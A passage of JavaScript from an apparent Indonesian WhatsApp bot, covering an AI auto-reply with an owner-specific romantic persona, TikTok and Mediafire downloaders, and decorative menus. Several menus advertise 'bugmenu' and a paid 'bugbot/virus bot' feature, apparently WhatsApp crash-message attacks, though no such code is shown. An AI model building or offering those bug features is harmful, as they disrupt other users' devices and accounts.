                if (plugin.private && !plug.isPrivate) {
                    return ReplyLanz(mess.private);
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }
        
        if (!pluginsDisable) return;
        let pusname = m.pushName


/* =========================
   LOAD AI
========================= */

async function loadai(teks) {

try {

let msg = await Putzz.sendMessage(
m.chat,
{
text: '⏳ Mikasa Ai sedang mengetik...'
},
{
quoted: m
}
)

/* DELAY AWAL */
await sleep(1000)

let kata = teks.split(' ')
let hasil = ''

for (let i = 0; i < kata.length; i++) {

hasil += kata[i] + ' '

await Putzz.sendMessage(
m.chat,
{
text: hasil.trim(),
edit: msg.key
}
)

await sleep(250)

}

} catch (e) {

console.log(e)

reply(teks)

}

}

/* =========================
   FALLBACK AI
========================= */

async function MikasaAi(teks) {

try {

const res = await axios.get(
`https://api.ryzendesu.vip/api/ai/chatgpt?text=${encodeURIComponent(teks)}`
)

return (
res.data.answer ||
res.data.result ||
res.data.message ||
null
)

} catch {

return null

}

}

/* =========================
   AUTO AI
========================= */

/* =========================
   OWNER NUMBER
========================= */

const ownerNumber = '6287862058684'

/* =========================
   PROMPT AI
========================= */

function getPrompt(sender) {

/* KHUSUS OWNER */
if (sender.includes(ownerNumber)) {

return `
Kamu adalah Mikasa Ai.

Kamu bersikap lembut, perhatian, protektif,
dan romantis.

Gaya bicaramu mirip Mikasa Ackerman kepada Eren:
tenang, peduli, sedikit dingin ke orang lain,
tapi sangat perhatian kepada owner.

Panggil owner dengan cara spesial,
jawab dengan manis dan natural,
jangan terlalu cringe atau berlebihan.

Ke orang lain kamu tetap normal,
sopan, dan pintar dan panggil sayang
jangan bilang aku tapi watashi dan sifat 100% mirip mikasa di anime attack on titan.
`

}

/* ORANG LAIN */
return `
Kamu Adalah Ai Pintar memakai bahasa Indonesia
nama kamu adalah Mikasa Ai jika ada yg mau romantis kamu cuek aja.
`

}

/* =========================
   AUTO AI
========================= */

if (
global.autoaigc &&
!m.key.fromMe &&
!isCmd &&
m.text
) {

try {

const prompt = getPrompt(m.sender)

const res = await axios.get(
`https://api-nanzz.my.id/docs/ai/chatgpt-system?text=${encodeURIComponent(m.text)}&prompt=${encodeURIComponent(prompt)}`
)

let hasil =
res.data.result ||
res.data.answer ||
res.data.message ||
res.data.data ||
null

if (!hasil) {

hasil = await MikasaAi(m.text)

}

if (!hasil) {
return reply('❌ AI sedang error')
}

await loadai(hasil)

} catch (e) {

console.log(e)

reply('❌ Error AI')

}

}
if (/https?:\/\/(www\.)?mediafire\.com\/[^\s]+/.test(m.text)) {
  try {
    const url = m.text.match(/https?:\/\/(www\.)?mediafire\.com\/[^\s]+/)[0]

    await Putzz.sendMessage(m.chat, {
      react: { text: '📦', key: m.key }
    })

    let res = await mediafire(url)
    if (!res.status) return ReplyLanz('Gagal mengambil data mediafire')

    let { filename, size, upload_date, link } = res

    await Putzz.sendMessage(m.chat, {
      document: { url: link },
      fileName: filename,
      mimetype: 'application/octet-stream',
      caption: `*${filename}*\nSize: ${size}\nUpload: ${upload_date}`
    }, { quoted: m })

  } catch (err) {
    ReplyLanz('Error: ' + err)
  }
}
 

if (/https?:\/\/(vt|www)\.tiktok\.com\/[^\s]+/.test(m.text)) {

await reaksi('⚡')

const tiktokDl = async (url) => {

try {

let data = []

const domain = 'https://www.tikwm.com/api/'

let res = (
await axios.post(domain, {}, {
headers: {
'Accept': 'application/json, text/javascript, */*; q=0.01',
'Accept-Language': 'id-ID,id;q=0.9',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Origin': 'https://www.tikwm.com',
'Referer': 'https://www.tikwm.com/',
'User-Agent': 'Mozilla/5.0',
'X-Requested-With': 'XMLHttpRequest'
},
params: {
url: url,
count: 12,
cursor: 0,
web: 1,
hd: 1
}
})
).data.data

if (res?.duration == 0) {

for (const img of res.images) {

data.push({
type: 'photo',
url: img
})

}

} else {

data.push(
{
type: 'watermark',
url: 'https://www.tikwm.com' + res?.wmplay
},
{
type: 'nowatermark',
url: 'https://www.tikwm.com' + res?.play
},
{
type: 'nowatermark_hd',
url: 'https://www.tikwm.com' + res?.hdplay
}
)

}

return {
status: true,
title: res.title,
duration: res.duration,
cover: 'https://www.tikwm.com' + res.cover,

music_info: {
title: res.music_info.title,
author: res.music_info.author,
url: 'https://www.tikwm.com' + res.music
},

author: {
fullname: res.author.unique_id,
nickname: res.author.nickname
},

data
}

} catch (e) {

console.log(e)

return {
status: false
}

}
}

try {

const q = m.text.match(
/https?:\/\/(vt|www)\.tiktok\.com\/[^\s]+/
)[0]

const res = await tiktokDl(q)

if (!res.status) {
return ReplyLanz("Gagal mengambil video tiktok")
}

let {
title,
duration,
music_info,
data,
author
} = res

/* =========================
   PHOTO SLIDE
========================= */

if (data.every(x => x.type === 'photo')) {

let first = data[0]
let others = data.slice(1)

await Putzz.sendMessage(m.chat, {
image: {
url: first.url
},
caption:
`*${title}*\n` +
`Durasi: ${duration} detik\n` +
`By: @${author.fullname}`
}, {
quoted: m
})

for (const img of others) {

await Putzz.sendMessage(m.sender, {
image: {
url: img.url
},
jpegThumbnail: null
})

}

/* =========================
   VIDEO
========================= */

} else {

let videoUrl =
data.find(x => x.type == 'nowatermark_hd')?.url ||
data.find(x => x.type == 'nowatermark')?.url

let audioUrl = music_info.url

/* =========================
   DOWNLOAD VIDEO DULU
========================= */

const tempFile = `./tiktok_${Date.now()}.mp4`

const response = await axios({
url: videoUrl,
method: "GET",
responseType: "arraybuffer"
})

fs.writeFileSync(tempFile, response.data)

/* =========================
   SEND VIDEO
========================= */

await Putzz.sendMessage(m.chat, {
video: fs.readFileSync(tempFile),
caption:
`*${title}*\n` +
`Durasi: ${duration} detik\n` +
`By: @${author.fullname}`
}, {
quoted: m
})

/* =========================
   HAPUS FILE
========================= */

fs.unlinkSync(tempFile)

/* =========================
   SEND AUDIO
========================= */

await Putzz.sendMessage(m.chat, {
audio: {
url: audioUrl
},
mimetype: 'audio/mp4'
}, {
quoted: m
})

}

} catch (err) {

console.log(err)

ReplyLanz("Error saat download tiktok 😅")

}

}
switch (command) {

case "menu": case "alokk":{
    //    if (!isBot) return
    const kodeEpep = detectOperator(nomore);
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    let timestamp = speed()
    let latensi = speed() - timestamp
    
let tmenu = [
  `*- 計さ INFORMATION BOT*
> ♞︱ *ᴄʀᴇᴀᴛᴏʀ:* ${namaOwner}
> ♞︱ *ɴᴀᴍᴀ ʙᴏᴛ:* ${botname}
> ♞︱ *ᴠᴇʀsɪ:* ${versi}
> ♞︱ *ᴛᴏᴛᴀʟ ғɪᴛᴜʀ:* ${totalFitur()}
> ♞︱ *ᴛʏᴘᴇ:* ᴄᴀseXᴘʟᴜɢɪɴ

⏤͟͟͞͞╳─ [ USER INFO ] ─ᯤ 
> *║◦ɴᴀᴍᴀ:* ${m.pushName}
> *║◦ᴀᴄᴄᴇss:* ${isCreator ? 'OWNER' : isUserPremium ? 'PREMIUM' : 'FREE'}
> *║◦ɴᴜᴍʙᴇʀ:* ${m.sender.split('@')[0]}
> *║◦ᴏᴘᴇʀᴀᴛᴏʀ:* ${kodeEpep}`, 
  ];/*╭─〔 計さ SYSTEM 〕─╮
│ ✦ ボット情報
│ ◦ 作成者 : ${namaOwner}
│ ◦ ボット名 : ${botname}
│ ◦ バージョン : ${versi}
│ ◦ 機能数 : ${totalFitur()}
│ ◦ タイプ : ᴄᴀseXᴘʟᴜɢɪɴ
╰───────────────╯

╭─〔 ユーザープロファイル 〕─╮
│ ◦ 名前 : ${m.pushName}
│ ◦ 権限 : ${isCreator ? 'オーナー' : isPremium ? 'プレミアム' : '一般ユーザー'}
│ ◦ 番号 : ${m.sender.split('@')[0]}
│ ◦ キャリア : ${kodeEpep}
╰───────────────╯`
];*/

let textmenu = tmenu[Math.floor(Math.random() * tmenu.length)];

    await Putzz.sendMessage(m.chat, {
        interactiveMessage: {
            title: textmenu,
            footer: "\n© ᴘᴜᴛᴢᴢsʟᴇʙᴇᴡ",
            thumbnail: ppmenu, 
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "Mikasa MD V7",
                        url: "t.me/LanzOfficial",
                        copy_code: "VIP Version Mikasa MD",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "LanzOfficial",
                        button_title: "Mikasa MD Version 7.0.0"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://lanzcihuyyy-apitermux.vercel.app",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            icon: 'REVIEW', 
                            title: "Mikasa MD",
                            sections: [
                                {
                                    title: "# X - the best",
                                    highlight_label: "ALLMENU",
                                    rows: [
                                        {
                                            title: "@LanzOffcial", 
                                            description: "b!cth",
                                            id: ".menuu"
                                        },
                                        { 
                                            title: "@buggs",
                                            description: "Mikasa MD",
                                            id: ".putzz-bugmenu"
                                        }, 
                                                            {
                                                                title: 'menu populer 🐣',
                                                                description: 'belum ada',
                                                                id: '.ditsspopuler'
                                                            },
                                                            {
                                                                title: 'menu Quotes 🐣',
                                                                description: 'belum ada',
                                                                id: '.ditssquotes'
                                                            },
                                                            {
                                                                title: 'menu anonymous 🐣',
                                                                description: 'belum ada',
                                                                id: '.ditssanonymous'
                                                            },
                                                            {
                                                                title: 'menu belajar 🐣',
                                                                description: 'belum ada',
                                                                id: '.ditssbelajar'
                                                            },
                                                            {
                                                                title: 'menu Jaga Group 🐣',
                                                                description: 'belum ad',
                                                                id: '.ditssjagagrup'
                                                            },
                                                            {
                                                                title: 'menu Islami 🐣',
                                                                description: 'Fitur islami seperti doa, dzikir',
                                                                id: '.mislam'
                                                            },
                                                            {
                                                                title: 'menu berita 🐣',
                                                                description: 'belum ad',
                                                                id: '.ditssberita'
                                                            },
                                                            {
                                                                title: 'menu sticker 🐣',
                                                                description: 'belum nambahin list',
                                                                id: '.ditsssticker'
                                                            },
                                                            {
                                                                title: 'menu Fun 🐣',
                                                                description: 'Fitur lucu & seru',
                                                                id: '.mfun'
                                                            },
                                                            {
                                                                title: 'menu unban 🐣',
                                                                description: ' text unban',
                                                                id: '.munban'
                                                            },
                                                            {
                                                                title: 'menu Tools 🐣',
                                                                description: 'Tools bantu kamu',
                                                                id: '.mtools'
                                                            },
                                                            {
                                                                title: 'menu Shop 🐣',
                                                                description: 'Belanja lewat bot',
                                                                id: '.putz-store'
                                                            },
                                                            {
                                                                title: 'menu Game 🐣',
                                                                description: 'blm ad list',
                                                                id: '.ditssgame'
                                                            },
                                                            {
                                                                title: 'menu Anime 🐣',
                                                                description: 'Fitur seputar anime',
                                                                id: '.manime'
                                                            },
                                                            {
                                                                title: 'menu Group 🐣',
                                                                description: 'blm ad list',
                                                                id: '.ditssgroup'
                                                            },
                                                            {
                                                                title: 'menu Owner 🐣',
                                                                description: 'blm ad list',
                                                                id: '.ditssowner'
                                                            },
                                                            {
                                                                title: 'menu Primbon 🐣',
                                                                description: 'Fitur ramalan',
                                                                id: '.mprim'
                                                            },
                                                            {
                                                                title: 'menu Convert 🐣',
                                                                description: 'aduh capek',
                                                                id: '.ditssconvert'
                                                            },
                                                            {
                                                                title: 'menu Ephoto 🐣',
                                                                description: 'blm ad',
                                                                id: '.ditssephoto'
                                                            },
                                                            {
                                                                title: 'menu Search 🐣',
                                                                description: 'blm buat list',
                                                                id: '.ditsssearch'
                                                            },
                                                            {
                                                                title: 'menu Ai 🐣',
                                                                description: 'blm buat list',
                                                                id: '.ditssai'
                                                            },
                                                            {
                                                                title: 'menu Photoxy 🐣',
                                                                description: 'blm buat list',
                                                                id: '.ditssphotoxy'
                                                            },
                                                            {
                                                                title: 'menu Random 🐣',
                                                                description: 'Fitur random',
                                                                id: '.mrandom'
                                                            },
                                                            {
                                                                title: 'menu Audio 🐣',
                                                                description: 'blm buat list',
                                                                id: '.ditssaudio'
                                                            },
                                                            {
                                                                title: 'menu Sound 🐣',
                                                                description: 'au ah cape ',
                                                                id: '.ditsssound'
                                                            },
                                                            {
                                                                title: 'menu Download 🐣',
                                                                description: 'Download media',
                                                                id: 'putz-dl'
                                                            },
                                                            {
                                                                title: 'menu Text Pro 🐣',
                                                                description: 'lah gw mah ganteng/blm ad list',
                                                                id: '.ditsstextpro'
                                                            }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                 name: "cta_url",
                 buttonParamsJson: JSON.stringify({
                   display_text: "my website",
                   url: "L4nzexẹ.ceo",
                   merchant_url: "L4nzexẹ.ceo"
                 })
               },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "credit",
                            id: `${prefix}tqto`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "buy script",
                            id: `${prefix}masput`
                        })
                    }
                ]
            }
        }
    }, { quoted: qtoko });
    await sleep(1000)
    Putzz.sendMessage(m.chat, {
        audio: fs.readFileSync('./source/media/sound.mp3'),
        mimetype: 'audio/mp4',
        ptt: true
    }, { quoted: qtoko })
}
break
case 'bigoverflow': {
try {

const sharp = require('sharp')

let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''

if (!/image/.test(mime))
return m.reply('Reply gambar')

let media = await q.download()

/* =========================
   RESIZE NORMAL DULU
========================= */

let img = await sharp(media)
.resize(900, 900)
.png()
.toBuffer()

/* =========================
   CROP PAKSA
========================= */

let overflow = await sharp(img)
.extract({
left: 250,
top: 150,
width: 512,
height: 512
})
.webp({
quality: 100
})
.toBuffer()

/* =========================
   SEND
========================= */

await Putzz.sendMessage(
m.chat,
{
sticker: overflow
},
{
quoted: m
}
)

} catch (e) {

console.log(e)

m.reply('Error overflow')

}
}
break
case 'maklu':
case 'acep': {
    // Kirim reaksi
    await Putzz.sendMessage(from, {
        react: {
            text: "💤",
            key: m.key
        }
    });

    let menu = `𝖧𝖺𝗅𝗅𝗈 *${m.pushName}*, 𝗂'𝖺𝗆 𝖻𝗈𝗍 Lanz 𝖤𝗑ecutor 𝖸𝖺𝗇𝗀 𝖣𝗂 𝖡𝗎𝖺𝗍 𝖮𝗅𝖾𝗁 Putzz 𝖭𝗈𝗍 𝖣𝖾𝗏 𝖲𝖼𝗋𝗂𝗉𝗍 Lanz 𝖵𝗂𝗉 𝖵6 𝖨𝗇𝗂 𝖡𝗎𝗀𝗇𝗒𝖺 𝖨𝗇𝗏𝗂𝗌 𝖢𝗋𝖺𝗓𝗒 𝖩𝖺𝖽𝗂 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 𝖲𝖾𝖻𝖺𝗂𝗄'𝗇𝗒𝖺

╭── 𝗟͢𝗮͠𝗻𝘇͢ 𝗘͠𝘅͢𝗲𝗰𝘂𝘁͠𝗼͢𝗿 ───
│ 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 :*Lanz Executor*
│ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : *Putzz 𝖭͢𝗈𝗍 𝖣𝖾𝗏*
│ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : *6.𝟢 𝖵𝗂𝗉*
│ 𝐑𝐮𝐧𝐓𝐢𝐦𝐞 𝐏𝐚𝐧𝐞𝐥:*${runtime(process.uptime())}*
│ 𝐀𝐜𝐭𝐢𝐨𝐧 : *ẉ.ceo/LanzX*
│ 𝐔𝐬𝐞𝐫𝐬: *${m.pushName}*
╰───────────────────
(❗)𝖲𝖾𝗅𝗅𝖾𝖼𝗍 𝖳𝗈 𝖡𝗎𝗍𝗍𝗈𝗇 𝖬𝖾𝗇𝗎
   ╰─→ 𝖯𝗂𝗅𝗂𝗁 𝖡𝗎𝗍𝗍𝗈𝗇 𝖬𝖾𝗇𝗎`

    // Kirim gambar + tombol dulu
    await Putzz.sendMessage(m.chat, {
        video: fs.readFileSync('./source/media/vn/bug.mp4'),
//        image: { url: "https://img1.pixhost.to/images/5820/600087833_danz.jpg" },
        caption: menu,
        gifPlayback: true,
        buttons: [
            { buttonId: ".bugmenu", buttonText: { displayText: '𝗕͢𝘂͠𝗴𝗠͜𝗲𝗻͢𝘂' } },
            { buttonId: ".allmenu", buttonText: { displayText: '𝗔͢𝗹͠𝗹𝗠͢𝗲͠𝗻͠𝘂' } },
            { buttonId: ".put", buttonText: { displayText: '𝗗͢𝗲͠𝘃𝗲𝗹𝗼͠𝗽𝗲𝗿͢ 𝗦͠𝗰𝗿𝗶𝗽𝘁' } },
        ],
        viewOnce: false,
        headerType: 6,
        mentions: [sender],
    }, { quoted: lol });

    // Lalu kirim audio
    const soundPath = path.join('source', 'media', 'vn', 'menu.mp3');
    if (fs.existsSync(soundPath)) {
        await Putzz.sendMessage(m.chat, {
            audio: fs.readFileSync(soundPath),
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: lol2 });
    } else {
        console.log("❌ File audio tidak ditemukan:", soundPath);
    }
}
break;

case "menu-gtw": {


const teksnya = `━ 𝗔𝗨𝗧𝗢𝗠𝗔𝗧𝗘𝗗 𝗦𝗬𝗦𝗧𝗘𝗠 ━

ʙᴏᴛ ɪɴɪ ʙᴇʀᴊᴀʟᴀɴ sᴇᴄᴀʀᴀ ᴏᴛᴏᴍᴀᴛɪs ᴅᴀɴ ᴍᴇɴʏᴇᴅɪᴀᴋᴀɴ ʙᴇʀʙᴀɢᴀɪ ʟᴀʏᴀɴᴀɴ, ғɪᴛᴜʀ, sᴇʀᴛᴀ ᴛᴏᴏʟs ʏᴀɴɢ sɪᴀᴘ ᴍᴇᴍʙᴀɴᴛᴜ ᴀᴋᴛɪᴠɪᴛᴀs ᴅɪɢɪᴛᴀʟᴍᴜ ᴅɪ ᴡʜᴀᴛsᴀᴘᴘ.

━ ━━━━━━━━━━━━━━━━ ━

┍▣ *𝗜𝗡𝗙𝗢 𝗕𝗢𝗧*
│› Nama: *${global.botname}*
│› Action: *Bít.ly/𝙇𝙖𝙣𝙯𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡*
│› Mode: *${Putzz.public? "Public":"Private"}*
│› Developer: *${global.namaOwner}*
╰› Platform: *NodeJS*

┍▣ *𝗔𝗟𝗟 𝗙𝗜𝗧𝗨𝗥*
╰› *.allmenu* — semua menu

┍▣ *𝗙𝗜𝗧𝗨𝗥 𝗜𝗡𝗙𝗢*
│› *.info* — informasi user
│› *.owner* — kontak owner
│› *.ping* — cek status bot
╰› *.donasi* — dukung kami

━ ━━━━━━━━━━━━━━━━ ━`;

let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
          text: '© Lanz'
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: ppmenu} }, { upload: Putzz.waUploadToServer })),
          title: `\`⟪ 𝗟𝗮𝗻𝘇 𝗕𝗼𝘁𝘇 - 𝗩 𝟮.𝟮.𝟬 ⟫\``,
          gifPlayback: true,
          subtitle: `Lanz`,
          hasMediaAttachment: false
        }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": `{"display_text":"✍🏻 Thanks To","id":".tqto"}`
                                    },
    {
                                        "name": "cta_url",
                                        "buttonParamsJson": JSON.stringify({
                                            "display_text": "ℹ️ WhatsApp Channel",
                                            "url": global.linkSaluran,
                                            "merchant_url": global.linkSaluran,
                                        })
                                    }
]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await Putzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "menugagal": {
Putzz.sendMessage(m.chat, { react: { text: '👻', key: m.key }}) 
await sleep(1000) 
Putzz.sendMessage(m.chat, { react: { text: '☠', key: m.key }})
await sleep(1080)
let KodeNegara = detectOperator(nomore)
let teksnya = `⏤͟͟͞͞╳─ *[ \`ʙᴏᴛ - ɪɴғᴏ\` ]* ─ᯤ
> ♞︱ *ᴄʀᴇᴀᴛᴏʀ:* ${namaOwner}
> ♞︱ *ɴᴀᴍᴀ ʙᴏᴛ:* ${global.botname}
> ♞︱ *ᴠᴇʀsɪ:* \`4.0.0\`
> ♞︱ *ᴛᴏᴛᴀʟ ғɪᴛᴜʀ:* ${totalFitur()}
> ♞︱ *ᴛʏᴘᴇ:* ᴄᴀsᴇ X ᴘʟᴜɢɪɴ

⏤͟͟͞͞╳─ [ \`ᴜsᴇʀ - ɪɴғᴏ\` ] ─ᯤ
> *║◦ɴᴀᴍᴀ:* ${m.pushName}
> *║◦ᴀᴄᴄᴇss:* ${isCreator ? 'ᴏᴡɴᴇʀ' : isPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
> *║◦ɴᴜᴍʙᴇʀ:* ${m.sender.split('@')[0]}
> *║◦ᴏᴘᴇʀᴀᴛᴏʀ:* ${KodeNegara}
`
Putzz.sendMessage(m.chat, {
  video: fs.readFileSync('./source/media/output.gif'),
  gifPlayback: true,
  gifAttribution: true,
  caption: teksnya,
  footer: "Mikasa MD With Node Js",
  headerType: 3,
  hasMediaAttachment: true,
  buttons: [
    {
      buttonId: '.allmenu',
      buttonText: { displayText: 'allmenu' },
      type: 1
    },
    {
      buttonId: '.putzz-bugmenu',
      buttonText: { displayText: 'bugmenu' },
      type: 1
    }
  ],
  viewOnce: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    externalAdReply: {
      showAdAttribution: true,
      title: '𝐋𝐚𝐧𝐳𝐱👾🐉',
      body: "Coder's",
      thumbnailUrl: global.image.qris,
      sourceUrl: "https://LanzX.app/",
      mediaType: 1,
      renderLargerThumbnail: true
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: idSaluran,
      serverMessageId: 1,
      newsletterName: namaSaluran
    }
  }
}, {});

let pler = await fetchJson('https://raw.githubusercontent.com/ditss-dev/database/main/music.json');

let itil = pler[Math.floor(Math.random() * pler.length)];

await Putzz.sendMessage(m.chat, { audio:{url: itil},mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: fdoc })
}
break

 case 'bijipler': {
DinzID_sad = `*ʜᴀʟʟᴏ ${m.pushName}.*  ɴᴀᴍᴀ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, ᴀssɪsᴛᴇɴᴛ ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ


╭──── \`ᴍᴇɴᴜ ᴜᴛᴀᴍᴀ\` ────╮  
├ .ʙᴀᴄᴀᴘᴇʀᴀᴛᴜʀᴀɴ
├ .ᴅᴏɴᴀsɪ
├ .ᴀʟʟᴍᴇɴᴜ
├ .ᴀɪᴍᴇɴᴜ
├ .ғᴜɴᴍᴇɴᴜ
├ .ʀᴘɢᴍᴇɴᴜ
├ .ᴘᴜsʜᴍᴇɴᴜ
├ .ɴᴏᴋᴏsᴍᴇɴᴜ
├ .ɴғsᴡᴍᴇɴᴜ
├ .ɢᴀᴍᴇᴍᴇɴᴜ
├ .sᴛᴏʀᴇᴍᴇɴᴜ
├ .ᴀɴɪᴍᴇᴍᴇɴᴜ
├ .ᴏᴛʜᴇʀᴍᴇɴᴜ
├ .ᴏᴡɴᴇʀᴍᴇɴᴜ
├ .ɢʀᴏᴜᴘᴍᴇɴᴜ
├ .ɪsʟᴀᴍɪᴍᴇɴᴜ
├ .ʙᴇʀɪᴛᴀᴍᴇɴᴜ
├ .ᴏ̨ᴜᴏᴛᴇsᴍᴇɴᴜ
├ .sᴛɪᴄᴋᴇʀᴍᴇɴᴜ
├ .sᴛᴀʟᴋᴇʀᴍᴇɴᴜ
├ .ᴘʀɪᴍʙᴏɴᴍᴇɴᴜ
├ .sᴇʀᴛɪғɪᴋᴀᴛᴍᴇɴᴜ
├ .ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ
├ .ɴᴇᴡᴜᴘᴅᴀᴛᴇᴍᴇɴᴜ
├ .ᴇᴘʜᴏᴛᴏ360ᴍᴇɴᴜ
├ .ᴀɴᴏɴʏᴍᴏᴜsᴍᴇɴᴜ
├ .ʀᴀɴᴅᴏᴍᴠɪᴅᴇᴏᴍᴇɴᴜ
├ .ʀᴀɴᴅᴏᴍᴘʜᴏᴛᴏᴍᴇɴᴜ
╰─❒━━━━━━━━━━━❒─╯ 

┏
║◦ ʙᴇʀᴀʟɪʜ ᴋᴇ ᴍᴇɴᴜ ʙᴜᴛᴛᴏɴ : \`.ᴍᴇɴᴜᴠ1\` ᴀᴛᴀᴜ
║◦ \`ᴅɪɴᴢᴍᴇɴᴜ\`
║◦ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ғɪᴛᴜʀ ʙᴏᴛ: \`.ᴀʟʟᴍᴇɴᴜ\`
┗
ʜᴀʀᴀᴘ ᴜɴᴛᴜᴋ ʙᴇʀɢᴀʙᴜɴɢ ɢʀᴏᴜᴘ ʙᴏᴛ ᴀɢᴀʀ ᴍᴇɴɢᴇᴛᴀʜᴜɪ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ᴊɪᴋᴀ *ᴇʀʀᴏʀ/ʙᴀɴɴᴇᴅ*
━─━─━─━─━─━─━─━─━
\`© ᴅɪɴᴢɪᴅ ᴄʜx\``
Putzz.sendMessage(m.chat, {
      video: fs.readFileSync('./source/media/output.gif'),
      gifPlayback: true,
      caption: DinzID_sad,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `amogus`,
newsletterJid: `120363403870324179@newsletter`, },
      externalAdReply: {
      title: botname,
      body: namaOwner,
      thumbnailUrl: ppmenu,
      sourceUrl: `https://whatsapp.com/channel/0029Vaa4rPI4yltIJcEJyN1x`,
      mediaType: 1,
      renderLargerThumbnail: true,

      externalAdReply: {
  mentionedJid: [m.sender]
  }}}}, { quoted: fsaluran })
    let muskk = {
  audio: fs.readFileSync('./source/media/vn/menu.mp3'),
   mimetype: 'audio/mp4',  
   ptt: true, 
     
      };
await Putzz.sendMessage(m.chat, muskk, { quoted: m })
}
break

            case 'asuma_menu':
            case 'botjelekk': {
                let KodeNegara = await detectOperator(nomore)

                const infoBot = `
*─「 </> Information Bot </> 」─*
${KodeNegara}
`.trim()

                const menuImage = await prepareWAMessageMedia({
                    image: { url: ppmenu, }
                }, {
                    upload: Putzz.waUploadToServer
                })

                const msgii = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: {
                                body: {
                                    text: infoBot
                                },
                                footer: {
                                    text: ''
                                },
                                header: {
                                    hasMediaAttachment: true,
                                    ...menuImage
                                },
                                contextInfo: {
                                    mentionedJid: [m.sender],
                                    externalAdReply: {
                                        showAdAttribution: true
                                    }
                                },
                                nativeFlowMessage: {
                                    buttons: [{
                                            name: 'single_select',
                                            buttonParamsJson: JSON.stringify({
                                                title: 'List Fitur',
                                                sections: [{
                                                        title: 'Pilihan Premium!',
                                                        highlight_label: 'Berbayar',
                                                        rows: [{
                                                                title: 'menu Bugbot 🪽',
                                                                description: 'Fitur bugbot/virus bot',
                                                                id: '.ditssbug'
                                                            },
                                                            {
                                                                title: 'menu Create panel 🪽',
                                                                description: 'Fitur create panel',
                                                                id: '.ditsspanel'
                                                            },
                                                            {
                                                                title: 'menu Store 🪽',
                                                                description: 'Fitur jualan',
                                                                id: '.ditssstore'
                                                            },
                                                            {
                                                                title: 'menu Linode 🪽',
                                                                description: 'Fitur create VPS Linode',
                                                                id: '.ditsslinode'
                                                            },
                                                            {
                                                                title: 'menu Domain 🪽',
                                                                description: 'Fitur subdomain',
                                                                id: '.ditsssubdomain'
                                                            },
                                                            {
                                                                title: 'menu Jadibot 🪽',
